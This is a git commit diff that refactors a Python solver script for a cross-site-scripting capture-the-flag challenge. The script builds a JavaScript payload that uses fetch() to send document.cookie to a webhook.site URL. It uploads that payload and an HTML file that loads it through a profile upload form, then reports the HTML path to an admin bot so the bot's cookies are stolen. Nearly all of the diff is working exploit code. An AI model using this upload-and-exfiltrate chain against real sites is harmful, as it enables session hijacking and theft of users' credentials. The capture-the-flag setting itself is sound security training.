0359fc07c41557ed709422e5933f3238b595a19e
SAW <99191294+nicsaw@users.noreply.github.com>
2025-04-15 21:27:28 +1000

    Profile V2 - Refactor

--- ctf/4-XSS/profile_v2.py
+++ ctf/4-XSS/profile_v2.py
@@ -13,12 +13,8 @@ class Solver:
         self.webhooksite = WebhookSite()
 
     def generate_file(self, file_content: str, filename: str):
-        with open(filename, 'w') as f:
-            f.write(file_content)
-
         svg_file = io.BytesIO(file_content.encode())
         svg_file.name = filename
-
         return svg_file.name, svg_file
 
     def get_uploaded_file_path(self):
@@ -29,8 +25,6 @@ class Solver:
         return img_element.get("src")
 
     def main(self):
-        print(self.webhooksite.view_url)
-
         # Craft JS File
         JS_PAYLOAD = f'fetch(`{self.webhooksite.url}?q=${{document.cookie}}`);'
         js_filename, js_file = self.generate_file(JS_PAYLOAD, "profile_v2.js")
@@ -38,20 +32,16 @@ class Solver:
         # Upload JS File
         self.session.post(f"{BASE_URL}/profile", files={"file": (js_filename, js_file)})
         js_file_path = self.get_uploaded_file_path()
-        js_file_path = js_file_path if js_file_path.endswith(".js") else "/profileimage/z5437741.js"
 
         # Craft HTML File
-        HTML_PAYLOAD = f'''<!DOCTYPE html>
-<html>
-    <script src="{js_file_path}"></script>
-</html>'''
-        filename, file = self.generate_file(HTML_PAYLOAD, "profile_v2.html")
+        HTML_PAYLOAD = f'<script src="{js_file_path}"></script>'
+        html_filename, html_file = self.generate_file(HTML_PAYLOAD, "profile_v2.html")
 
         # Upload HTML File
-        self.session.post(f"{BASE_URL}/profile", files={"file": (filename, file)})
+        self.session.post(f"{BASE_URL}/profile", files={"file": (html_filename, html_file)})
         html_file_path = self.get_uploaded_file_path()
 
-        # Report to Admin
+        # Report HTML File to Admin
         self.session.post(f"{BASE_URL}/report", data={"path": html_file_path})
 
         # Find flag in webhook.site
